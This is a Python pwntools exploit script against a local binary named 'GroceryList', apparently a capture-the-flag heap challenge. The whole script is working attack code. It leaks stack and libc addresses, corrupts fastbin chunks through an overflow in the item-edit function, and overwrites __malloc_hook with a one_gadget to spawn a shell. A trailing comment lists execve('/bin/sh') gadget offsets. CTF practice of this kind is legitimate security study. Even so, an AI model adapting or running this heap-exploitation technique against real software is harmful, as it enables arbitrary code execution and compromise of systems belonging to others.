from pwn import *
from LibcSearcher import LibcSearcher

p = process("./GroceryList")
context.log_level = "debug"
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

cmd = lambda c : p.sendlineafter("7. Exit\n" , str(c))

def edit(index , name):
	cmd(5)
	p.sendlineafter("Which item would you like to edit?\n" , str(index))
	p.sendlineafter("Enter your item`s new name: \n" , name)

def remove(index):
	cmd(4)
	p.sendlineafter("Which item would you like to remove?\n" , str(index))

def add_e(size , num):
	cmd(3)
	p.sendlineafter("3. Large\n" , str(size))
	p.sendlineafter("How many items would you like to add?" , str(num))

def debug():
	gdb.attach(p)
	pause()

cmd(6)
cmd(1)
p.recvuntil("0. ")
stack_addr = u64(p.recv(6).ljust(8 , "\x00")) 
fake_addr = stack_addr - 0x13 - 0x8
log.info("stack : " + hex(stack_addr))
add_e(1 , 2) # 1 # 2
remove(2)
edit(1 , "a" * 0x18 + p64(0x21) + p64(fake_addr))
add_e(1 , 2) # 2 # 3
cmd(1)
p.recvuntil("3. ")
libc_start_main = u64(p.recv(6).ljust(8 , "\x00")) - 240
libc.address = libc_start_main - libc.sym["__libc_start_main"]
fake_addr = libc.sym["__malloc_hook"] - 0x23
log.info("malloc_hook : " + hex(libc.sym["__malloc_hook"]))
add_e(3 , 2) # 0x60 # 2 # 4 # 5
remove(5)
edit(4 , "a" * 0x68 + p64(0x71) + p64(fake_addr))
add_e(3 , 2) # 0x60 # 2 # 5 # 6
# overwrite __malloc_hook
one_gadget = libc.address + 0x4526a
edit(6 , "a" * 0x13 + p64(one_gadget) + p64(libc.sym['__libc_realloc'] + 16))
log.info(hex(one_gadget))

add_e(1,1) 

p.interactive()

"""
0x45216	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
